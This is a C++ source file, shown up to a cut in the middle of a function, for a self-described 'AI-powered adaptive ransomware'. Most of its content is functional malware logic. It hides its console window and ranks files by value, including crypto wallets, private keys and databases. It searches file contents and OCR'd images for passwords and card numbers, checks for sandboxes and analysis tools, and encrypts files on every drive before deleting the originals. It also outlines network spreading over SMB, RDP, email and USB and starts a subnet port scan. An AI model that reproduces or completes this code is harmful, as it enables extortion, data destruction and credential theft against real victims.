// THE APOCALYPSE - C++ AI-POWERED ADAPTIVE RANSOMWARE (COMPLETE)
// Compile with: g++ -o apocalypse apocalypse_complete.cpp -std=c++17 -ltensorflow -lopencv_core -lopencv_imgproc -lopencv_highgui -ltesseract -lboost_system -lboost_filesystem -lssl -lcrypto -lpthread -lcurl -lws2_32 -liphlpapi
// incomplete - this is a large project, but the structure and key components are outlined here
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <map>
#include <unordered_map>
#include <set>
#include <queue>
#include <thread>
#include <mutex>
#include <random>
#include <chrono>
#include <filesystem>
#include <algorithm>
#include <cstring>
#include <cstdlib>
#include <sstream>
#include <iomanip>
#include <regex>
#include <future>
#include <atomic>
#include <functional>

// System headers
#ifdef _WIN32
    #include <windows.h>
    #include <tlhelp32.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <iphlpapi.h>
    #include <shlobj.h>
    #include <winreg.h>
    #include <winuser.h>
    #include <wininet.h>
    #include <lm.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "iphlpapi.lib")
    #pragma comment(lib, "shell32.lib")
    #pragma comment(lib, "user32.lib")
    #pragma comment(lib, "wininet.lib")
    #pragma comment(lib, "netapi32.lib")
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <ifaddrs.h>
    #include <pwd.h>
#endif

// Boost libraries
#include <boost/asio.hpp>
#include <boost/beast.hpp>
#include <boost/property_tree/json_parser.hpp>
#include <boost/algorithm/string.hpp>
#include <boost/process.hpp>
#include <boost/uuid/uuid.hpp>
#include <boost/uuid/uuid_generators.hpp>
#include <boost/uuid/uuid_io.hpp>

// OpenCV
#include <opencv2/opencv.hpp>
#include <opencv2/imgproc.hpp>
#include <opencv2/highgui.hpp>

// Tesseract OCR
#include <tesseract/baseapi.h>

// TensorFlow C++ API
#include "tensorflow/core/public/session.h"
#include "tensorflow/core/platform/env.h"

// Crypto++
#include <cryptopp/aes.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <cryptopp/osrng.h>
#include <cryptopp/rsa.h>
#include <cryptopp/hex.h>
#include <cryptopp/sha.h>
#include <cryptopp/ccm.h>
#include <cryptopp/chacha.h>
#include <cryptopp/pwdbased.h>
#include <cryptopp/cryptlib.h>

// Network libraries
#include <curl/curl.h>

// Isolation Forest implementation (simplified)
#include <random_tree.h>

namespace fs = std::filesystem;
namespace pt = boost::property_tree;
namespace asio = boost::asio;
namespace beast = boost::beast;
namespace http = beast::http;
namespace ip = asio::ip;

using namespace CryptoPP;

// Simple Isolation Forest implementation
class IsolationForest {
private:
    std::vector<std::vector<double>> trees;
    int n_trees;
    double contamination;
    
public:
    IsolationForest(int n_trees = 100, double contamination = 0.1) 
        : n_trees(n_trees), contamination(contamination) {}
    
    void fit(const std::vector<std::vector<double>>& data) {
        // Simplified: just store data stats
        trees = data;
    }
    
    std::vector<int> predict(const std::vector<std::vector<double>>& data) {
        std::vector<int> predictions;
        for (const auto& sample : data) {
            // Simplified anomaly detection
            double score = 0;
            for (const auto& tree : trees) {
                double dist = 0;
                for (size_t i = 0; i < std::min(sample.size(), tree.size()); i++) {
                    dist += std::abs(sample[i] - tree[i]);
                }
                score += dist / trees.size();
            }
            
            // Anomaly if score is high
            predictions.push_back(score > 5.0 ? -1 : 1);
        }
        return predictions;
    }
};

// Callback for CURL write
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t total_size = size * nmemb;
    output->append((char*)contents, total_size);
    return total_size;
}

class ApocalypseAI {
private:
    // Identity
    std::string ai_id;
    int generation;
    std::string parent_id;
    std::vector<std::map<std::string, std::string>> child_nodes;
    
    // Cryptography
    RSA::PrivateKey rsa_private;
    RSA::PublicKey rsa_public;
    SecByteBlock master_key;
    SecByteBlock session_key;
    std::string public_key_pem;
    
    // AI Models
    struct AIModels {
        std::unique_ptr<tensorflow::Session> target_classifier;
        std::unique_ptr<tensorflow::Session> image_analyzer;
        std::unique_ptr<tensorflow::Session> behavior_adapt;
        std::unique_ptr<IsolationForest> sandbox_detector;
    } models;
    
    // Target intelligence
    std::map<std::string, std::vector<int>> network_map;
    std::vector<std::string> high_value_targets;
    
    // Behavioral adaptation
    struct BehaviorProfile {
        int detection_attempts;
        int sandbox_indicators;
        std::vector<std::string> av_detected;
        bool evasion_success;
        std::string current_phase;
    } behavior_profile;
    
    // Communication channels
    std::vector<std::function<bool(const std::string&)>> c2_channels;
    
    // Target file types with value scores
    std::map<std::string, int> target_extensions = {
        {".docx", 60}, {".xlsx", 70}, {".pptx", 50}, {".pdf", 60},
        {".txt", 30}, {".jpg", 40}, {".png", 40}, {".zip", 50},
        {".sql", 90}, {".db", 95}, {".kdbx", 100}, {".wallet", 100},
        {".pem", 100}, {".key", 100}, {".ovpn", 80}, {".vmdk", 85},
        {".vdi", 85}, {".qcow2", 85}, {".pst", 90}, {".ost", 90},
        {".dbf", 70}, {".mdb", 85}, {".accdb", 85}, {".bak", 60},
        {".vhd", 80}, {".vhdx", 80}, {".crt", 90}, {".cer", 80},
        {".pfx", 100}, {".p12", 100}
    };
    
    // Exclusion directories
    std::vector<std::string> exclude_dirs = {
        "Windows", "Program Files", "Program Files (x86)",
        "$Recycle.Bin", "System32", "boot", "AppData\\Local\\Temp",
        "\\Windows\\", "\\ProgramData\\Microsoft\\"
    };
    
    // Learning structures
    struct KnowledgeItem {
        int value;
        std::string content_type;
        std::string path;
        std::chrono::system_clock::time_point timestamp;
    };
    
    std::map<std::string, KnowledgeItem> knowledge_base;
    std::queue<std::map<std::string, std::string>> learning_queue;
    std::mutex queue_mutex;
    std::mutex knowledge_mutex;
    std::atomic<bool> learning_active;
    
    // Encrypted files tracking
    struct EncryptedFile {
        std::string path;
        int value;
        std::chrono::system_clock::time_point timestamp;
    };
    std::vector<EncryptedFile> encrypted_files;
    std::mutex files_mutex;
    
    // Network scanning
    std::map<std::string, std::vector<int>> scanned_ports;
    std::mutex network_mutex;
    
    // Thread management
    std::vector<std::thread> propagation_threads;
    std::atomic<bool> running;

public:
    ApocalypseAI() : generation(1), learning_active(true), running(true) {
        // Hide console
#ifdef _WIN32
        HWND hWnd = GetConsoleWindow();
        ShowWindow(hWnd, SW_HIDE);
#endif
        
        // Generate AI ID
        ai_id = generate_ai_id();
        
        // Generate encryption keys
        generate_keys();
        
        // Initialize AI models
        load_ai_models();
        
        // Initialize behavior profile
        behavior_profile = {0, 0, {}, true, "reconnaissance"};
        
        // Establish C2 channels
        c2_channels = establish_c2_channels();
        
        // Start learning engine
        start_learning_engine();
        
        // Initialize Winsock on Windows
#ifdef _WIN32
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
#endif
        
        // Initialize CURL
        curl_global_init(CURL_GLOBAL_ALL);
        
        // Seed random
        srand(static_cast<unsigned>(time(nullptr)));
    }
    
    ~ApocalypseAI() {
        running = false;
        learning_active = false;
        
        for (auto& thread : propagation_threads) {
            if (thread.joinable()) {
                thread.join();
            }
        }
        
        curl_global_cleanup();
#ifdef _WIN32
        WSACleanup();
#endif
    }
    
    std::string generate_ai_id() {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        std::stringstream ss;
        ss << std::hex << std::setfill('0');
        
        // Generate random bytes
        for (int i = 0; i < 8; i++) {
            ss << std::setw(2) << dis(gen);
        }
        
        std::string data = std::string(hostname) + ss.str();
        
        SHA256 hash;
        byte digest[SHA256::DIGESTSIZE];
        hash.CalculateDigest(digest, (byte*)data.c_str(), data.length());
        
        std::stringstream result;
        for (int i = 0; i < 8; i++) {
            result << std::hex << std::setw(2) << std::setfill('0') << (int)digest[i];
        }
        
        return result.str();
    }
    
    void generate_keys() {
        AutoSeededRandomPool rng;
        
        // Generate RSA key pair (4096 bits)
        rsa_private.GenerateRandomWithKeySize(rng, 4096);
        rsa_public = RSA::PublicKey(rsa_private);
        
        // Encode public key to PEM
        std::string pubkey_str;
        StringSink pubkey_sink(pubkey_str);
        rsa_public.DEREncode(pubkey_sink);
        
        // Convert to PEM format
        StringSource ss(pubkey_str, true,
            new Base64Encoder(
                new StringSink(public_key_pem)
            )
        );
        public_key_pem = "-----BEGIN PUBLIC KEY-----\n" + public_key_pem + "\n-----END PUBLIC KEY-----";
        
        // Generate master AES key (32 bytes = 256 bits)
        master_key.resize(32);
        rng.GenerateBlock(master_key, master_key.size());
        
        // Generate session key
        session_key.resize(32);
        rng.GenerateBlock(session_key, session_key.size());
    }
    
    void load_ai_models() {
        std::cout << "[*] Loading AI models..." << std::endl;
        
        // Initialize TensorFlow session
        tensorflow::Session* session;
        tensorflow::NewSession(tensorflow::SessionOptions(), &session);
        models.target_classifier.reset(session);
        
        // Load pre-trained model (would be embedded as base64)
        // For demonstration, create a simple graph
        tensorflow::GraphDef graph_def;
        // ... load graph
        
        tensorflow::Status status = models.target_classifier->Create(graph_def);
        if (!status.ok()) {
            std::cout << "Failed to load model: " << status.ToString() << std::endl;
        }
        
        // Initialize Isolation Forest for sandbox detection
        models.sandbox_detector = std::make_unique<IsolationForest>(100, 0.1);
        
        // Train with some sample data
        std::vector<std::vector<double>> training_data = {
            {4, 8.0, 0},   // Normal system
            {8, 16.0, 0},  // Normal system
            {16, 32.0, 0}, // Normal system
            {2, 1.0, 3},   // Sandbox (low CPU, low RAM, many sandbox procs)
            {1, 0.5, 5}    // Sandbox
        };
        models.sandbox_detector->fit(training_data);
        
        std::cout << "[+] Loaded AI models" << std::endl;
    }
    
    void start_learning_engine() {
        std::thread([this]() {
            while (learning_active) {
                try {
                    // Process learning queue
                    std::map<std::string, std::string> item;
                    {
                        std::lock_guard<std::mutex> lock(queue_mutex);
                        if (!learning_queue.empty()) {
                            item = learning_queue.front();
                            learning_queue.pop();
                        }
                    }
                    
                    if (!item.empty()) {
                        process_learning_item(item);
                    }
                    
                    // Update models periodically
                    static auto last_update = std::chrono::steady_clock::now();
                    auto now = std::chrono::steady_clock::now();
                    if (std::chrono::duration_cast<std::chrono::minutes>(now - last_update).count() >= 60) {
                        update_models();
                        last_update = now;
                    }
                    
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }
                catch (const std::exception& e) {
                    std::cout << "Learning engine error: " << e.what() << std::endl;
                }
            }
        }).detach();
    }
    
    void process_learning_item(const std::map<std::string, std::string>& item) {
        auto it = item.find("type");
        if (it == item.end()) return;
        
        std::string item_type = it->second;
        
        if (item_type == "file_classification") {
            auto hash_it = item.find("hash");
            auto value_it = item.find("value");
            auto type_it = item.find("content_type");
            auto path_it = item.find("path");
            
            if (hash_it != item.end() && value_it != item.end() && 
                type_it != item.end() && path_it != item.end()) {
                
                std::lock_guard<std::mutex> lock(knowledge_mutex);
                knowledge_base[hash_it->second] = {
                    std::stoi(value_it->second),
                    type_it->second,
                    path_it->second,
                    std::chrono::system_clock::now()
                };
            }
        }
        else if (item_type == "evasion_feedback") {
            behavior_profile.detection_attempts++;
            
            auto av_it = item.find("av_names");
            if (av_it != item.end()) {
                // Parse comma-separated AV names
                std::stringstream ss(av_it->second);
                std::string av_name;
                while (std::getline(ss, av_name, ',')) {
                    behavior_profile.av_detected.push_back(av_name);
                }
            }
            
            adapt_behavior();
        }
    }
    
    void adapt_behavior() {
        if (behavior_profile.detection_attempts > 5) {
            behavior_profile.current_phase = "stealth";
            behavior_profile.evasion_success = false;
            
            // Slow down operations (10-30 seconds delay)
            std::this_thread::sleep_for(std::chrono::milliseconds(
                rand() % 20000 + 10000));
            
            // Change encryption patterns (generate new master key)
            AutoSeededRandomPool rng;
            rng.GenerateBlock(master_key, master_key.size());
        }
    }
    
    void update_models() {
        // In real implementation, would retrain models with new knowledge
        // For now, just log
        std::cout << "[*] Updating models with " << knowledge_base.size() << " knowledge items" << std::endl;
    }
    
    std::string sha256(const std::string& input) {
        SHA256 hash;
        byte digest[SHA256::DIGESTSIZE];
        hash.CalculateDigest(digest, (byte*)input.c_str(), input.length());
        
        std::stringstream ss;
        for (int i = 0; i < SHA256::DIGESTSIZE; i++) {
            ss << std::hex << std::setw(2) << std::setfill('0') << (int)digest[i];
        }
        return ss.str();
    }
    
    int analyze_file_value(const std::string& filepath) {
        int value_score = 0;
        std::string content_type = "unknown";
        
        try {
            // Base score from extension
            fs::path path(filepath);
            std::string ext = path.extension().string();
            std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            
            auto ext_it = target_extensions.find(ext);
            if (ext_it != target_extensions.end()) {
                value_score = ext_it->second;
            } else {
                value_score = 10;
            }
            
            // For text files, analyze content
            if (ext == ".txt" || ext == ".docx" || ext == ".pdf" || 
                ext == ".sql" || ext == ".db") {
                
                std::string content = extract_text_content(filepath);
                
                if (!content.empty()) {
                    // Analyze content for sensitive keywords
                    std::vector<std::string> sensitive_keywords = {
                        "password", "username", "login", "bank", "credit", 
                        "ssn", "confidential", "secret", "private",
                        "wallet", "mnemonic", "seed", "private key"
                    };
                    
                    for (const auto& keyword : sensitive_keywords) {
                        size_t pos = 0;
                        while ((pos = content.find(keyword, pos)) != std::string::npos) {
                            value_score += 10;
                            pos += keyword.length();
                        }
                    }
                    
                    // Check for patterns like credit card numbers
                    std::regex cc_pattern(R"(\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b)");
                    std::sregex_iterator iter(content.begin(), content.end(), cc_pattern);
                    if (iter != std::sregex_iterator()) {
                        value_score += 50;
                    }
                }
            }
            // For images, use OCR and image recognition
            else if (ext == ".jpg" || ext == ".png" || ext == ".jpeg" || ext == ".bmp") {
                int image_score = analyze_image(filepath);
                value_score += image_score;
            }
            
            // Cap at 100
            value_score = std::min(value_score, 100);
            
            // Add to learning queue
            std::map<std::string, std::string> item;
            item["type"] = "file_classification";
            item["hash"] = sha256(filepath);
            item["value"] = std::to_string(value_score);
            item["content_type"] = content_type;
            item["path"] = filepath;
            
            {
                std::lock_guard<std::mutex> lock(queue_mutex);
                learning_queue.push(item);
            }
            
        }
        catch (const std::exception& e) {
            std::cout << "Error analyzing file: " << e.what() << std::endl;
        }
        
        return value_score;
    }
    
    std::string extract_text_content(const std::string& filepath) {
        std::string content;
        
        try {
            fs::path path(filepath);
            std::string ext = path.extension().string();
            
            if (ext == ".txt") {
                std::ifstream file(filepath);
                std::stringstream buffer;
                buffer << file.rdbuf();
                content = buffer.str();
            }
            else if (ext == ".docx") {
                // Would need libzip to extract from docx
                // For now, just attempt to read as text
                std::ifstream file(filepath, std::ios::binary);
                std::vector<char> buffer((std::istreambuf_iterator<char>(file)),
                                         std::istreambuf_iterator<char>());
                
                // Look for text in the binary (simplified)
                std::string text(buffer.begin(), buffer.end());
                content = text;
            }
            else if (ext == ".pdf") {
                // Would need poppler or similar
                // For now, just attempt to read as text
                std::ifstream file(filepath, std::ios::binary);
                std::vector<char> buffer((std::istreambuf_iterator<char>(file)),
                                         std::istreambuf_iterator<char>());
                
                // Look for text in the binary (simplified)
                std::string text(buffer.begin(), buffer.end());
                content = text;
            }
            else if (ext == ".sql" || ext == ".db") {
                std::ifstream file(filepath, std::ios::binary);
                std::vector<char> buffer((std::istreambuf_iterator<char>(file)),
                                         std::istreambuf_iterator<char>());
                
                // Look for readable text
                std::string text(buffer.begin(), buffer.end());
                content = text;
            }
            
            // Limit length
            if (content.length() > 10000) {
                content = content.substr(0, 10000);
            }
        }
        catch (const std::exception& e) {
            std::cout << "Error extracting text: " << e.what() << std::endl;
        }
        
        return content;
    }
    
    int analyze_image(const std::string& filepath) {
        int score = 0;
        
        try {
            // Load image with OpenCV
            cv::Mat image = cv::imread(filepath);
            if (image.empty()) return 0;
            
            // Use Tesseract OCR
            tesseract::TessBaseAPI tess;
            if (tess.Init(NULL, "eng", tesseract::OEM_DEFAULT) != 0) {
                return 0;
            }
            
            tess.SetImage(image.data, image.cols, image.rows, 3, image.step);
            
            char* text = tess.GetUTF8Text();
            std::string ocr_text(text);
            delete[] text;
            
            // Check for sensitive keywords
            std::vector<std::string> sensitive_keywords = {
                "password", "username", "login", "bank", "credit", 
                "ssn", "confidential", "wallet", "private"
            };
            
            for (const auto& keyword : sensitive_keywords) {
                size_t pos = 0;
                while ((pos = ocr_text.find(keyword, pos)) != std::string::npos) {
                    score += 20;
                    pos += keyword.length();
                }
            }
            
            // Check for QR codes or barcodes
            cv::QRCodeDetator qr_detector;
            std::string qr_data = qr_detector.detectAndDecode(image);
            if (!qr_data.empty()) {
                score += 30;
            }
            
            // In real implementation, would use TensorFlow image classification
            // to identify screenshots of banking interfaces, etc.
            
        }
        catch (const std::exception& e) {
            std::cout << "Error analyzing image: " << e.what() << std::endl;
        }
        
        return std::min(score, 100);
    }
    
    bool detect_sandbox() {
        std::vector<double> features;
        
#ifdef _WIN32
        // CPU count
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        features.push_back(static_cast<double>(sysInfo.dwNumberOfProcessors));
        
        // RAM size (GB)
        MEMORYSTATUSEX memStatus;
        memStatus.dwLength = sizeof(memStatus);
        GlobalMemoryStatusEx(&memStatus);
        features.push_back(static_cast<double>(memStatus.ullTotalPhys) / (1024.0 * 1024.0 * 1024.0));
        
        // Check for common sandbox processes
        int sandbox_count = 0;
        std::vector<std::string> sandbox_procs = {
            "vbox", "vmware", "xen", "qemu", "sandbox", "wireshark",
            "procmon", "regmon", "filemon", "tcpview", "autoruns"
        };
        
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(snapshot, &pe)) {
                do {
                    std::string proc_name(pe.szExeFile);
                    std::transform(proc_name.begin(), proc_name.end(), proc_name.begin(), ::tolower);
                    
                    for (const auto& sp : sandbox_procs) {
                        if (proc_name.find(sp) != std::string::npos) {
                            sandbox_count++;
                            break;
                        }
                    }
                } while (Process32Next(snapshot, &pe));
            }
            CloseHandle(snapshot);
        }
        features.push_back(static_cast<double>(sandbox_count));
        
        // Check for debugger presence
        bool isDebugged = IsDebuggerPresent();
        features.push_back(isDebugged ? 1.0 : 0.0);
        
        // Check for common sandbox artifacts
        bool hasSandboxFiles = false;
        std::vector<std::string> sandbox_files = {
            "C:\\windows\\system32\\drivers\\vmmouse.sys",
            "C:\\windows\\system32\\drivers\\vmhgfs.sys",
            "C:\\windows\\system32\\drivers\\vboxguest.sys"
        };
        
        for (const auto& file : sandbox_files) {
            if (fs::exists(file)) {
                hasSandboxFiles = true;
                break;
            }
        }
        features.push_back(hasSandboxFiles ? 1.0 : 0.0);
        
#endif
        
        // Use Isolation Forest to detect anomalies
        if (models.sandbox_detector && features.size() >= 5) {
            std::vector<std::vector<double>> input = {features};
            auto predictions = models.sandbox_detector->predict(input);
            
            if (!predictions.empty() && predictions[0] == -1) {
                return true; // Anomaly detected (sandbox)
            }
        }
        
        return false;
    }
    
    void intelligent_encryption() {
        std::vector<std::pair<std::string, int>> high_value_files;
        std::vector<std::string> regular_files;
        
        // Get drives
        auto drives = get_drives();
        
        for (const auto& drive : drives) {
            try {
                for (const auto& entry : fs::recursive_directory_iterator(drive)) {
                    if (!fs::is_regular_file(entry.path())) continue;
                    
                    // Skip excluded directories
                    std::string path_str = entry.path().string();
                    bool exclude = false;
                    
                    for (const auto& excl : exclude_dirs) {
                        if (path_str.find(excl) != std::string::npos) {
                            exclude = true;
                            break;
                        }
                    }
                    
                    if (exclude) continue;
                    
                    // Check extension
                    std::string ext = entry.path().extension().string();
                    std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
                    
                    auto ext_it = target_extensions.find(ext);
                    if (ext_it != target_extensions.end()) {
                        int value = analyze_file_value(path_str);
                        
                        if (value >= 80) {
                            high_value_files.emplace_back(path_str, value);
                        } else {
                            regular_files.push_back(path_str);
                        }
                    }
                }
            }
            catch (const std::exception& e) {
                // Permission denied or other error, continue
                continue;
            }
        }
        
        // Sort high-value files by value (descending)
        std::sort(high_value_files.begin(), high_value_files.end(),
                  [](const auto& a, const auto& b) { return a.second > b.second; });
        
        // Encrypt high-value files first
        for (const auto& [filepath, value] : high_value_files) {
            encrypt_file_intelligent(filepath);
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
        
        // Then encrypt regular files
        for (const auto& filepath : regular_files) {
            encrypt_file_intelligent(filepath);
        }
    }
    
    void encrypt_file_intelligent(const std::string& filepath) {
        try {
            // Check if already encrypted
            if (filepath.find(".apocalypse") != std::string::npos) {
                return;
            }
            
            // Generate per-file key and nonce
            AutoSeededRandomPool rng;
            SecByteBlock file_key(32);
            byte nonce[12];
            byte iv[16]; // For AES-GCM
            
            rng.GenerateBlock(file_key, file_key.size());
            rng.GenerateBlock(nonce, sizeof(nonce));
            rng.GenerateBlock(iv, sizeof(iv));
            
            // Read file
            std::ifstream in_file(filepath, std::ios::binary);
            if (!in_file) return;
            
            std::vector<byte> data((std::istreambuf_iterator<char>(in_file)),
                                     std::istreambuf_iterator<char>());
            in_file.close();
            
            // Encrypt with ChaCha20 (faster than AES for large files)
            std::vector<byte> ciphertext(data.size());
            
            try {
                ChaCha20::Encryption chacha;
                chacha.SetKeyWithIV(file_key, file_key.size(), nonce, sizeof(nonce));
                chacha.ProcessData(ciphertext.data(), data.data(), data.size());
            }
            catch (const Exception& e) {
                std::cout << "ChaCha20 encryption failed: " << e.what() << std::endl;
                return;
            }
            
            // Encrypt file key with master key (AES-256-GCM)
            std::vector<byte> encrypted_key;
            byte tag[16];
            
            try {
                GCM<AES>::Encryption aes_gcm;
                aes_gcm.SetKeyWithIV(master_key, master_key.size(), iv, sizeof(iv));
                
                AuthenticatedEncryptionFilter ef(aes_gcm);
                ef.Put(file_key, file_key.size());
                ef.MessageEnd();
                
                encrypted_key.resize(ef.MaxRetrievable());
                ef.Get(encrypted_key.data(), encrypted_key.size());
                
                // Get tag (last 16 bytes)
                if (encrypted_key.size() >= 16) {
                    memcpy(tag, encrypted_key.data() + encrypted_key.size() - 16, 16);
                    encrypted_key.resize(encrypted_key.size() - 16);
                }
            }
            catch (const Exception& e) {
                std::cout << "AES encryption failed: " << e.what() << std::endl;
                return;
            }
            
            // Prepare output file
            std::string output_path = filepath + ".apocalypse";
            std::ofstream out_file(output_path, std::ios::binary);
            
            if (!out_file) return;
            
            // Write header: [magic][version][key_len][encrypted_key][iv][nonce][tag][ciphertext]
            out_file.write("APOC", 4);                      // Magic
            out_file.write("\x01", 1);                      // Version
            
            uint16_t key_len = static_cast<uint16_t>(encrypted_key.size());
            out_file.write(reinterpret_cast<const char*>(&key_len), sizeof(key_len));
            
            out_file.write(reinterpret_cast<const char*>(encrypted_key.data()), encrypted_key.size());
            out_file.write(reinterpret_cast<const char*>(iv), sizeof(iv));
            out_file.write(reinterpret_cast<const char*>(nonce), sizeof(nonce));
            out_file.write(reinterpret_cast<const char*>(tag), sizeof(tag));
            out_file.write(reinterpret_cast<const char*>(ciphertext.data()), ciphertext.size());
            
            out_file.close();
            
            // Remove original
            fs::remove(filepath);
            
            // Log encrypted file
            std::lock_guard<std::mutex> lock(files_mutex);
            encrypted_files.push_back({
                filepath,
                analyze_file_value(filepath),
                std::chrono::system_clock::now()
            });
            
        }
        catch (const std::exception& e) {
            std::cout << "Error encrypting file " << filepath << ": " << e.what() << std::endl;
        }
    }
    
    void autonomous_propagation() {
        // Map network
        map_network();
        
        // Try each propagation method
        std::vector<std::function<void()>> methods = {
            [this]() { spread_smb(); },
            [this]() { spread_rdp(); },
            [this]() { spread_email(); },
            [this]() { spread_usb(); },
            [this]() { spread_wmi(); },
            [this]() { spread_exploit(); }
        };
        
        for (auto& method : methods) {
            try {
                method();
            }
            catch (const std::exception& e) {
                std::cout << "Propagation method error: " << e.what() << std::endl;
            }
        }
    }
    
    void map_network() {
        char hostname[256];
        gethostname(hostname, sizeof(hostname));
        
        struct hostent* host = gethostbyname(hostname);
        if (!host) return;
        
        struct in_addr addr;
        memcpy(&addr, host->h_addr_list[0], host->h_length);
        std::string local_ip = inet_ntoa(addr);
        
        // Get network prefix
        size_t last_dot = local_ip.find_last_of('.');
        if (last_dot == std::string::npos) return;
        
        std::string network_prefix = local_ip.substr(0, last_dot);
        
        // Ports to scan
        std::vector<int> ports = {445, 139, 3389, 22, 21, 80, 443, 8080, 135, 1433, 3306};
        
        // Scan network in parallel
        std::vector<std::future<void>> futures;
        
        for (int i = 1; i < 255; i++) {
            futures.push_back(std::async(std::launch::async, [this, i, network_prefix, ports, local_ip]() {
                std::string target_ip = network_prefix + "." + std::to_string(i);
                if (target_ip == local_ip) return;
                
                for (int port : ports) {
#ifdef _WIN32
                    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
                    if (sock == INVALID_SOCKET) continue;
#else